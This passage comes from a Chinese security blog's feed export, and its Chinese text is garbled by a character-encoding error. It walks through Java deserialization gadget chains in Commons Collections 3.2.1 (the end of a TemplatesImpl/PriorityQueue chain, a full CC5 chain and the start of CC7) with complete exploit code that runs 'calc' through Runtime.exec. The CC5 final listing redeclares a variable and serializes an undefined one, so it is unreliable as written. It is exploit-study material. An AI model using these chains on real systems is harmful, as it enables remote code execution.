class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-comment">//PriorityQueueè°ƒç”¨TransformingComparator.compare()</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="è°ƒè¯•ä»£ç "><a href="#è°ƒè¯•ä»£ç " class="headerlink" title="è°ƒè¯•ä»£ç "></a>è°ƒè¯•ä»£ç </h3><p>æ ¹æ®è¿™ä¸ªè°ƒç”¨é“¾å»è°ƒè¯•ä¸€ä¸‹</p>
<p><img src="https://image.sp4rks.xyz/2024/06/6.png" alt="6"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601130436070.png" alt="image-20240601130436070"></p>
<p>è¿›å…¥<code>heapify()</code>æ–¹æ³•ä¸­æˆ‘ä»¬æƒ³è°ƒç”¨<code>siftDown()</code></p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-type">void</span> <span class="hljs-title">heapify</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) <span class="hljs-comment">//å‘ç°è¿™ä¸ªåˆ¤æ–­è¿‡ä¸å»</span><br>        <span class="hljs-built_in">siftDown</span>(i, (E) queue[i]);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601130808273.png" alt="image-20240601130808273"></p>
<p>sizeå¤§å°æœ€ä½ä¸º2çš„æ—¶å€™æ‰èƒ½è¿‡è¿™ä¸ªåˆ¤æ–­ï¼Œè¿›å…¥<code>siftDown()</code>ï¼ˆsizeè¡¨ç¤ºé˜Ÿåˆ—ä¸­å½“å‰å…ƒç´ çš„æ•°é‡ï¼‰</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601130816243.png" alt="image-20240601130816243"></p>
<p>æ‰€ä»¥æˆ‘ä»¬çŸ¥é“äº†éœ€è¦è‡³å°‘ä¸¤ä¸ªå…ƒç´ ï¼Œå½“æˆ‘ä»¬æœ‰ä¸¤ä¸ªå…ƒç´ ä¹‹åï¼Œåºåˆ—åŒ–çš„æ—¶å€™æ‰§è¡Œäº†æ‰€æœ‰ä»£ç </p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601131409516.png" alt="image-20240601131409516"></p>
<p>å› ä¸º<code>add()</code>æ–¹æ³•æœ€ç»ˆä¼šæ‰§è¡Œåˆ°<code>compare()</code>æ–¹æ³•ï¼Œå¯¼è‡´åºåˆ—åŒ–çš„æ—¶å€™å°±è¿è¡Œã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601223552106.png" alt="image-20240601223552106"></p>
<p>é‚£è¿™å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œæˆ‘ä»¬æƒ³è¦ä»–ååºåˆ—åŒ–çš„æ—¶å€™æ‰§è¡Œã€‚  </p>
<p>ä¿®æ”¹æ–¹æ³•å¦‚ä¸‹:</p>
<h3 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//æ‰§è¡Œä»£ç çš„ç±»</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        <span class="hljs-comment">//åŠ¨æ€åŠ è½½</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), instantiateTransformer&#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br><span class="hljs-comment">//        chainedTransformer.transform(1);</span><br><br><br><br><br>    <span class="hljs-comment">//è°ƒç”¨ ChainedTransformer.transform()ã€‚(è¿™é‡Œæ”¾çš„æ˜¯ConstantTransformer&lt;&gt;()ï¼Œç›®çš„æ˜¯åºåˆ—åŒ–çš„æ—¶å€™ä¸è®©è¿™æ¡é“¾æ‰§è¡Œ)</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br>       <span class="hljs-comment">//PriorityQueueè°ƒç”¨TransformingComparator.compare()</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>		<br>        <span class="hljs-comment">//åå°„ä¿®æ”¹transformingComparatorçš„å€¼ä¸ºtransformerï¼Œè®©å…¶ååºåˆ—åŒ–çš„æ—¶å€™è®©é“¾è¿æ¥èµ·æ¥</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformerField.set(transformingComparator, chainedTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="å‚è€ƒè¿æ¥"><a href="#å‚è€ƒè¿æ¥" class="headerlink" title="å‚è€ƒè¿æ¥"></a>å‚è€ƒè¿æ¥</h2><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(å››)-æ‘†çƒ‚çš„å®Œç»“ç¯‡</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC5</title>
    <url>/2024/06/02/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC5/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬è´¨ä¸Šä¹Ÿå°±æ˜¯å‰é¢å‡ æ¡CCé“¾æ”¹æ¥æ”¹å»ï¼Œæ¢äº†ä¸€ä¸ªå…¥å£ç±»ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/CC5.png" alt="CC5"></p>
<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul>
<li>JDK8u65</li>
<li>commons-collections 3.2.1</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h2 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h2><p>ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºæ¥è¿˜æ˜¯é€šè¿‡<code>LazyMap</code>è°ƒç”¨<code>ChainedTransformer.transform()</code>æœ€ç»ˆè°ƒç”¨<code>InvokerTransformer.transform()</code>æ‰§è¡Œä»£ç </p>
<p>æ€è·¯æ˜¯ä¸€æ ·çš„ï¼Œæ‰¾è°è°ƒç”¨äº†<code>get()</code>æ–¹æ³•ï¼Œ2000+ç»“æœï¼Œå‡­æˆ‘ä»¬è‡ªå·±å¯èƒ½å¾ˆéš¾æ‰¾åˆ°äº†ï¼Œysoserialä¸­æœ€ç»ˆæ˜¯æ‰¾åˆ°äº†<code>TiedMapEntry.toString()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602153105891.png" alt="image-20240602153105891"></p>
<p><code>TiedMapEntry.toString</code>è°ƒç”¨äº†<code>getValue()</code>æ–¹æ³•</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602151949039.png" alt="image-20240602151949039"></p>
<p><code>TiedMapEntry.getValue()</code>æœ€ç»ˆè°ƒç”¨äº†<code>get()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602152006941.png" alt="image-20240602152006941"></p>
<p>é‚£æ¥ç€å°±æ˜¯æ‰¾è°è°ƒç”¨äº†<code>toString()</code>æ–¹æ³•æœ€å¥½æ˜¯åœ¨<code>readObject()</code>ä¸­ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†<code>BadAttributeValueExpException.readObject()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602152124747.png" alt="image-20240602152124747"></p>
<h2 id="CC5ç¼–å†™"><a href="#CC5ç¼–å†™" class="headerlink" title="CC5ç¼–å†™"></a>CC5ç¼–å†™</h2><p>ä»ä¸Šé¢çš„å›¾ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ååŠéƒ¨åˆ†é“¾å…¶å®å’ŒCC1æˆ–è€…CC6æ˜¯ä¸€æ ·çš„ï¼Œå¤åˆ¶ç²˜è´´æ²¡ä»€ä¹ˆå¥½è¯´çš„</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, chainedTransformer);<br>        <br> <span class="hljs-comment">//TiedMapEntryæ”¾å…¥lazymapï¼ŒTiedMapEntryçš„æ„é€ å™¨ä¸­ç¬¬ä¸€ä¸ªä¸ºMapï¼Œç¬¬äºŒä¸ªä¸ºObjectã€‚æ‰€ä»¥mapå°±å¯ä»¥ä¼ å…¥æˆ‘ä»¬æ„é€ å¥½çš„lazymap</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-number">1</span>);<br> <br><span class="hljs-comment">//æ„æ€æ˜¯ååºåˆ—åŒ–è‡ªåŠ¨æ‰§è¡ŒBadAttributeValueExpException.readObject()ï¼Œå› ä¸ºBadAttributeValueExpExceptionæ”¾å…¥çš„æ˜¯tiedMapEntryï¼Œé‚£å°±ä¼šæ‰§è¡ŒtiedMapEntryçš„readObject()</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(tiedMapEntry);<br>        <br></code></pre></td></tr></table></figure>

<h3 id="åºåˆ—åŒ–è‡ªåŠ¨æ‰§è¡Œçš„é—®é¢˜"><a href="#åºåˆ—åŒ–è‡ªåŠ¨æ‰§è¡Œçš„é—®é¢˜" class="headerlink" title="åºåˆ—åŒ–è‡ªåŠ¨æ‰§è¡Œçš„é—®é¢˜"></a>åºåˆ—åŒ–è‡ªåŠ¨æ‰§è¡Œçš„é—®é¢˜</h3><p>å†™äº†ä¸Šé¢çš„ä»£ç å‘ç°ï¼Œåºåˆ—åŒ–çš„æ—¶å€™å°±è‡ªåŠ¨æ‰§è¡Œäº†ã€‚è°ƒè¯•ä¸€ä¸‹å°±å°±çŸ¥é“ï¼Œåœ¨<code>BadAttributeValueExpException</code>çš„æ„é€ å™¨ç›´æ¥è°ƒç”¨äº†<code>toString()</code>æ–¹æ³•ï¼Œå¯¼è‡´åºåˆ—åŒ–çš„æ—¶å€™æ‰§è¡Œå®Œæ¯•ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602154714433.png" alt="image-20240602154714433"></p>
<p>è§£å†³åŠæ³•å°±æ˜¯é€šè¿‡åå°„å…ˆæ”¾ä¸€ä¸ªæ²¡ç”¨çš„ä¸œè¥¿åœ¨é‡Œé¢ï¼Œåºåˆ—åŒ–ä¹‹å‰å†æŠŠ<code>tiedMapEntry</code>æ”¾è¿›å»ã€‚</p>
<p><code>BadAttributeValueExpException</code>ä¹Ÿæ”¯æŒåºåˆ—åŒ–ï¼Œè™½ç„¶å½“å‰ç±»æ²¡æœ‰ç›´æ¥ç»§æ‰¿<code>Serializable</code>æ¥å£ï¼Œä½†æ˜¯å®ƒç¥–ç±»<code>Throwable</code>ç»§æ‰¿äº†Serializableæ¥å£ï¼Œæ‰€ä»¥<code>BadAttributeValueExpException</code>ä¹Ÿæ”¯æŒåºåˆ—åŒ–ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.lang.Object<br>  â†³ java.lang.Throwable<br>    â†³ java.lang.Exception<br>      â†³ javax.management.BadAttributeValueExpException<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602152143747.png" alt="image-20240602152143747"></p>
<h2 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, chainedTransformer);<br>        <br> <span class="hljs-comment">//TiedMapEntryæ”¾å…¥lazymapï¼ŒTiedMapEntryçš„æ„é€ å™¨ä¸­ç¬¬ä¸€ä¸ªä¸ºMapï¼Œç¬¬äºŒä¸ªä¸ºObjectã€‚æ‰€ä»¥mapå°±å¯ä»¥ä¼ å…¥æˆ‘ä»¬æ„é€ å¥½çš„lazymap</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-number">1</span>);<br> <br><span class="hljs-comment">//æ„æ€æ˜¯ååºåˆ—åŒ–è‡ªåŠ¨æ‰§è¡ŒBadAttributeValueExpException.readObject()ï¼Œå› ä¸ºBadAttributeValueExpExceptionæ”¾å…¥çš„æ˜¯tiedMapEntryï¼Œé‚£å°±ä¼šæ‰§è¡ŒtiedMapEntryçš„readObject()</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(tiedMapEntry);<br>		<br>        <span class="hljs-comment">//åå°„ä¿®æ”¹å€¼</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BadAttributeValueExpException</span>&gt; c = badAttributeValueExpException.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(badAttributeValueExpException, tiedMapEntry);<br><br><br>        serialize(badAttributeValueExpException1);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(å››)-æ‘†çƒ‚çš„å®Œç»“ç¯‡</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC7</title>
    <url>/2024/06/04/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC7/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>CC7æœ¬è´¨ä¸Šä¹Ÿæ˜¯å¯¹CC1çš„æ”¹å†™ï¼Œèµ°åˆ°äº†ä¸‡æ¶ä¹‹æºLazyMapæœ€ç»ˆå¯¼è‡´ååºåˆ—åŒ–ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/CC7.png" alt="CC7"></p>
<h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h3><p><code>æ•£åˆ—å‡½æ•°(å“ˆå¸Œå‡½æ•°)</code>ä¸­å¿ƒæ€æƒ³ï¼š</p>
<ul>
<li>ä¸åŒå‚æ•°è¿”å›ä¸åŒå“ˆå¸Œå€¼</li>
<li>ç›¸åŒå‚æ•°è¿”å›ç›¸åŒå“ˆå¸Œå€¼</li>
</ul>
